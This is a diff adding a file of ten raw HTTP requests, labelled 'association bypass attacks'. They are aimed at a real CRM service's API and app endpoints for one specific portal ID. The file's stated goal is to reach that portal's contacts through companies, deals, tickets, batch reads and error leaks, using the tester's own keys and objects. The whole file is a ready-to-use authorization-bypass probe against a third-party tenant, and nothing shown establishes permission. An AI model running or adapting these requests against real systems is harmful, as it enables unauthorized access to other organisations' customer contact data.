@@ -1,0 +1,76 @@
+# ========================================
+# ASSOCIATION BYPASS ATTACKS
+# Access contacts through other CRM objects
+# ========================================
+
+# REQUEST 1: Get Contact Associations
+GET /crm/v3/objects/contacts/1/associations/companies?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 2: Get Associations from Company Side
+# First create a company in YOUR portal, then:
+GET /crm/v3/objects/companies/YOUR_COMPANY_ID/associations/contacts?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 3: Batch Association Read
+POST /crm/v4/associations/contacts/companies/batch/read?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"inputs":[{"id":"1"}]}
+
+
+# REQUEST 4: Association Schema Read
+GET /crm/v4/associations/contacts/companies/labels?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 5: Create Association (might leak data in error)
+PUT /crm/v4/objects/companies/YOUR_COMPANY_ID/associations/contacts/1/CONTACT_TO_COMPANY?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 6: Get Contact via Deal Association
+GET /crm/v3/objects/deals/YOUR_DEAL_ID/associations/contacts?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 7: Get Contact via Ticket Association
+GET /crm/v3/objects/tickets/YOUR_TICKET_ID/associations/contacts?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 8: Association via App Domain
+GET /api/crm-associations/v1/associations/0-1/1/HUBSPOT_DEFINED?portalId=46962361 HTTP/2
+Host: app.hubspot.com
+Cookie: YOUR_SESSION_COOKIES_HERE
+Content-Type: application/json
+
+
+# REQUEST 9: Auto-associations check
+GET /api/crm-associations-features/v3/auto-associations?portalId=46962361 HTTP/2
+Host: app.hubspot.com
+Cookie: YOUR_SESSION_COOKIES_HERE
+Content-Type: application/json
+
+
+# REQUEST 10: Get All Association Types
+GET /crm/v4/associations/contacts/deals/labels?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
